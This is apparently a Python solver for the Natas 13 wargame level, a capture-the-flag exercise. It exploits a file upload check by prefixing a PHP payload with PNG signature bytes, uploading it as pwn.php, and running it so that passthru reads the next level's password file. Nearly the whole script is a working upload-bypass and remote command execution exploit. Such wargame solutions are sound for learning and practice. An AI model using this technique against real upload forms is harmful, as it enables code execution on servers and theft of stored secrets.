"""
natas13: file upload checks for image file signatures but accepts any extension
"""

import re
import requests
from bs4 import BeautifulSoup
from typing import Optional

from natas_utils import *

LEVEL = 13

# see http://www.libpng.org/pub/png/spec/1.2/PNG-Structure.html
PNG_FIRST_BYTES = bytes.fromhex("89504e470d0a1a0a")

def solve(url: str, login: LevelLogin) -> Optional[str]:
    data = {
        "filename": "pwn.php",
    }
    payload = {
        "uploadedfile": PNG_FIRST_BYTES + bytes(f"<? passthru('cat {NATAS_DATA['flag_path']}natas{LEVEL + 1}'); ?>", "utf8"),
    }
    response = requests.post(url, auth=login, data=data, files=payload)
    response.raise_for_status()

    page_content = BeautifulSoup(response.text, "html.parser").find("div", attrs={"id": "content"})
    uploaded_payload_path = page_content.find("a", attrs={"href": re.compile(r'.php$')}).get("href")

    response = requests.get(f"{url}/{uploaded_payload_path}", auth=login)

    # the flag _should_ be the only text in the response, but test it to be sure
    return try_level_login(LEVEL + 1, extract_candidate_passwords(response.text, in_html_body=False))

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))